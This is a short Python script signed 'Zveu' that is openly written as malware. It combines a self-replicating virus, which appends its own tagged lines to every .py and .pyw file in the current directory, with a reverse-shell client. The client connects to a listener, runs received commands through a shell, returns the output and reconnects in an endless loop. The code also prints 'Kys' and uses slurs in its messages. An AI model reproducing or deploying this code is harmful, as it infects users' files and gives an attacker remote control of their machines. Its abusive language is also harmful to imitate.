print("Kys <3")


#BY Zveu #69

import os #69

import socket #69

import subprocess #69

import time #69

import signal #69

import sys #69

import struct #69

import glob #69

from string import * #69

Files = glob.glob("*.py") + glob.glob("*.pyw") #69

for Files in Files: #69

   vCode = open(__file__, 'r') #69

   victim = open (Files, 'r') #69

   readvictim = victim.read() #69

   if find(readvictim, "~Zveu~") == -1: #69

       victim = open(Files, 'a') #69

       for code in vCode.readlines(): #69

            if ("#69") in code: #69

                vCode.close() #69

                mycode=(chr(10)+code) #69

                victim.write(mycode) #69

class Client(object): #69

    def __init__(self): #69

        self.serverHost = '127.0.0.1' #69

        self.serverPort = 9999 #69

        self.socket = None #69

    def register_signal_handler(self): #69

        signal.signal(signal.SIGINT, self.quit_gracefully) #69

        signal.signal(signal.SIGTERM, self.quit_gracefully) #69

        return #69

    def quit_gracefully(self, signal=None, frame=None): #69

        print('\nWHY ;-;') #69

        if self.socket: #69

            try: #69

                self.socket.shutdown(2) #69

                self.socket.close() #69

            except Exception as e: #69

                print('Could not close connection %s' % str(e)) #69

        sys.exit(0) #69

        return #69

    def socket_create(self): #69

        try: #69

            self.socket = socket.socket() #69

        except socket.error as e: #69

            print("Sockets fucked up " + str(e)) #69

            return #69

        return #69

    def socket_connect(self): #69

        try: #69

            self.socket.connect((self.serverHost, self.serverPort)) #69

        except socket.error as e: #69

            print("RIP: " + str(e)) #69

            time.sleep(5) #69

            raise #69

        try: #69

            self.socket.send(str.encode(socket.gethostname())) #69

        except socket.error as e: #69

            print("Airplains are crashing: " + str(e)) #69

            raise #69

        return #69

    def print_output(self, output_str): #69

        sent_message = str.encode(output_str + str(os.getcwd()) + '> ') #69

        self.socket.send(struct.pack('>I', len(sent_message)) + sent_message) #69

        print(output_str) #69

        return #69

    def receive_commands(self): #69

        try: #69

            self.socket.recv(10) #69

        except Exception as e: #69

            print('Could not start communication with server: %s\n' %str(e)) #69

            return #69

        cwd = str.encode(str(os.getcwd()) + '> ') #69

        self.socket.send(struct.pack('>I', len(cwd)) + cwd) #69

        while True: #69

            output_str = None #69

            data = self.socket.recv(20480) #69

            if data == b'': break #69

            elif data[:2].decode("utf-8") == 'cd': #69

                directory = data[3:].decode("utf-8") #69

                try: #69

                    os.chdir(directory.strip()) #69

                except Exception as e: #69

                    output_str = "Could not change directory: %s\n" %str(e) #69

                else:  #69

                    output_str = "" #69

            elif data[:].decode("utf-8") == 'quit': #69

                self.socket.close() #69

                break #69

            elif len(data) > 0: #69

                try: #69

                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, #69

                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE) #69

                    output_bytes = cmd.stdout.read() + cmd.stderr.read() #69

                    output_str = output_bytes.decode("utf-8", errors="replace") #69

                except Exception as e: #69

                    output_str = "Slave did what you said: %s\n" %str(e) #69

            if output_str is not None: #69

                try: #69

                    self.print_output(output_str) #69

                except Exception as e: #69

                    print('Slaves being a fag: %s' %str(e)) #69

        self.socket.close() #69

        return #69

def main(): #69

    client = Client() #69

    client.register_signal_handler() #69

    client.socket_create() #69

    while True: #69

        try: #69

            client.socket_connect() #69

        except Exception as e: #69

            print("Sockets are killing themselfs: %s" %str(e)) #69

            time.sleep(5)      #69

        else: #69

            break     #69

    try: #69

        client.receive_commands() #69

    except Exception as e: #69

        print('FUCK! ' + str(e)) #69

    client.socket.close() #69

    return #69

if __name__ == '__main__': #69

    while True: #69

        main() #69
